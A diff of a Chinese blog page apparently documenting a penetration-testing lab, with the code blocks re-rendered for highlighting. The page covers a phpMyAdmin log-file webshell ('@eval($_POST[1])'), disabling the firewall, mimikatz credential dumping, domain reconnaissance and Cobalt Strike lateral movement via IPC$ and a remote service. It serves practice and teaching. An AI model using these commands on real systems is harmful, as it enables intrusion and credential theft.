@@ -17,7 +17,7 @@
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -249,26 +249,26 @@
 <h5 id="PhpMyadmin-GetShell"><a href="#PhpMyadmin-GetShell" class="headerlink" title="PhpMyadmin GetShell"></a>PhpMyadmin GetShell</h5><p>通过日志getshell，原理如下</p>
 <p>general log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell:</p>
 <p>第一步：查看当前的日志配置</p>
-<pre><code class="mysql">show variables like &#39;general%&#39;;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;general%&#x27;;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715152510312-1723540470170-37.png" alt="image-20240715152510312"></p>
 <p>当前日志是关闭的，且存的目录也一起打印了</p>
 <p>第二步：开启日志</p>
-<pre><code class="mysql">set global general_log = on;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log = on;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715152721039-1723540470170-41.png" alt="image-20240715152721039"></p>
 <p>开启后，一些操作就会被记录到这里，但我们没法访问这个文件，所以我们需要改变这个路径</p>
 <p>第三步：自定义日志路径</p>
 <p><img src="/../image/image-20240715152951579-1723540470170-43.png" alt="image-20240715152951579"></p>
 <p>在探针中包含了两个路径，我们可以随便挑一个来写木马，这里我们新建一个</p>
-<pre><code class="mysql">set global general_log_file=&#39;C:/phpStudy/WWW/yxz.php&#39;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log_file=&#x27;C:/phpStudy/WWW/yxz.php&#x27;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715153238139-1723540470170-44.png" alt="image-20240715153238139"></p>
 <p><img src="/../image/image-20240715153311205-1723540470170-42.png" alt="image-20240715153311205"></p>
 <p>成功访问日志</p>
 <p>第四步：执行查询让日志记录木马</p>
-<pre><code class="mysql">select &#39;&lt;?php @eval($_POST[1]); ?&gt;&#39;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715153730208-1723540470170-45.png" alt="image-20240715153730208"></p>
 <p>成功记录在文件里了，</p>
 <p>常见连接shell工具</p>
@@ -288,19 +288,18 @@
 <h5 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h5><p>查看3389端口是否开放</p>
 <p><img src="/../image/image-20240715161554112-1723540470170-50.png" alt="image-20240715161554112"></p>
 <p>没有，那我们需要给他开启</p>
-<pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&quot;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&quot;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715161743108-1723540470170-51.png" alt="image-20240715161743108"></p>
 <p><img src="/../image/image-20240715161852487-1723540470170-52.png" alt="image-20240715161852487"></p>
 <p>远程关闭防火墙</p>
-<pre><code>netsh firewall show state
-netsh firewall set opmode disable
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh firewall show state</span><br><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715162107970-1723540470170-55.png" alt="image-20240715162107970"></p>
 <p><img src="/../image/image-20240715162126128-1723540470170-53.png" alt="image-20240715162126128"></p>
 <p>但我们还不知道密码，所以需要获取密码，要用到mimikatz</p>
-<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot; &quot;exit&quot;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
 <p>也可以看SAM文件，这里我们用mimikatz，给它上传到web服务器去</p>
 <p><img src="/../image/image-20240715162709527-1723540470170-56.png" alt="image-20240715162709527"></p>
 <p><img src="/../image/image-20240715163049524-1723540470170-54.png" alt="image-20240715163049524"></p>
@@ -331,39 +330,38 @@ netsh firewall set opmode disable
 <p><img src="/../image/image-20240715171050953-1723540470170-61.png" alt="image-20240715171050953"></p>
 <p>所以前面那个应该是域账号</p>
 <p>第二部：收集主机信息，里面有加入的域名</p>
-<pre><code>systeminfo
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715171134242-1723540470170-64.png" alt="image-20240715171134242"></p>
 <p><img src="/../image/image-20240715171151193-1723540470170-65.png" alt="image-20240715171151193"></p>
 <p>第三步：看域里有多少个用户</p>
-<pre><code>net user /domain
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715171312675-1723540470170-66.png" alt="image-20240715171312675"></p>
 <p>域中有5个用户</p>
 <p>第三步：看有几台电脑</p>
-<pre><code>net group &quot;domain computers&quot; /domain
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715171433293-1723540470170-67.png" alt="image-20240715171433293"></p>
 <p>三台,除了STU1，还有</p>
 <p>DEV1和ROOT-TVI862UBEH</p>
 <p>第四步：查域的ip和域名</p>
-<pre><code>nslookup -type=SRV _ldap._tcp
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -type=SRV _ldap._tcp</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715171746916-1723540470171-68.png" alt="image-20240715171746916"></p>
 <p>域控ip:192.168.52.138</p>
 <p>域全名：owa.god.org前面的owa是机器名</p>
 <p>第五步：查看IP地址</p>
-<pre><code>ipconfig
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715172004155-1723540470171-69.png" alt="image-20240715172004155"></p>
 <p>还有另一个ip，看下这个网段里存活了几台机器</p>
-<pre><code>arp -a
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715172041070-1723540470171-70.png" alt="image-20240715172041070"></p>
 <p>存活两台主机138和141，ping一下，结合之前的机器名</p>
-<pre><code>ping DEV1.god.org
-ping ROOT-TVI862UBEH.god.org
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping DEV1.god.org</span><br><span class="line">ping ROOT-TVI862UBEH.god.org</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715172712495-1723540470171-71.png" alt="image-20240715172712495"></p>
 <p>192.168.52.138 -owa.god.org域控</p>
 <p>192.168.52.141 -ROOT-TVI862UBEH.god.org域内主机</p>
@@ -371,8 +369,8 @@ ping ROOT-TVI862UBEH.god.org
 <p>优先控制域控</p>
 <p>Webshell管理工具也可以执行命令，但是在一些操作上实受限的，比如想提权，想扫描想横向，想代理都是不方便的怎么办呢??接下来就要使用CS或者MSF工具</p>
 <h4 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h4><p>注意攻击机要和服务器在同一网段，或者互项ping的通</p>
-<pre><code>teamserver.bat ip 123456
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">teamserver.bat ip 123456</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715190012891-1723540470171-72.png" alt="image-20240715190012891"></p>
 <p><img src="/../image/image-20240715190237382-1723540470171-73.png" alt="image-20240715190237382"></p>
 <p>创建监听器</p>
@@ -411,8 +409,8 @@ ping ROOT-TVI862UBEH.god.org
 <p><img src="/../image/image-20240715224525490-1723540470171-83.png" alt="image-20240715224525490"></p>
 <p><img src="/../image/image-20240715224714373-1723540470171-84.png" alt="image-20240715224714373"></p>
 <p>然后执行命令</p>
-<pre><code>net use \\192.168.52.138\ipc$ &quot;admin@123&quot; /user:god\administrator
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.52.138\ipc$ &quot;admin@123&quot; /user:god\administrator</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715224816747-1723540470171-86.png" alt="image-20240715224816747"></p>
 <p>执行成功后，我们可以看下有没有建立ipc管道</p>
 <p><img src="/../image/image-20240715224931351-1723540470171-85.png" alt="image-20240715224931351"></p>
@@ -430,23 +428,23 @@ ping ROOT-TVI862UBEH.god.org
 <p><img src="/../image/image-20240715225836702-1723540470171-90.png" alt="image-20240715225836702"></p>
 <p><img src="/../image/image-20240715230026157-1723540470171-91.png" alt="image-20240715230026157"></p>
 <p>然后我们把木马再传到域控的C盘去</p>
-<pre><code>copy smb.exe \\192.168.52.138\C$
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy smb.exe \\192.168.52.138\C$</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715230416091-1723540470171-99.png" alt="image-20240715230416091"></p>
 <p>下面就是执行木马的问题了，这里我们通过创建服务的方式去运行木马</p>
-<pre><code>sc \\owa.god.org create test binpath= &quot;cmd.exe /c c:\smb.exe&quot;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc \\owa.god.org create test binpath= &quot;cmd.exe /c c:\smb.exe&quot;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715230938480-1723540470171-98.png" alt="image-20240715230938480"></p>
 <p>前面一次运行失败了，改了个空格就是binpath&#x3D;后面要加个空格</p>
 <p>服务创建成功后，我们就要开启服务</p>
-<pre><code>sc \\owa.god.org start test
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc \\owa.god.org start test</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715231512828-1723540470171-93.png" alt="image-20240715231512828"></p>
 <p>这样就是成功开启了，要及时连接，不然会</p>
 <p><img src="/../image/image-20240715231311416-1723540470171-94.png" alt="image-20240715231311416"></p>
 <p><strong>连接目标机器(必须主动连接)</strong></p>
-<pre><code>link owa.god.org
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">link owa.god.org</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240715231536929-1723540470171-95.png" alt="image-20240715231536929"></p>
 <p>成功上线system权限</p>
 <h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p><img src="/../image/image-20240715001019514-1723540470171-96.png" alt="image-20240715001019514"></p>
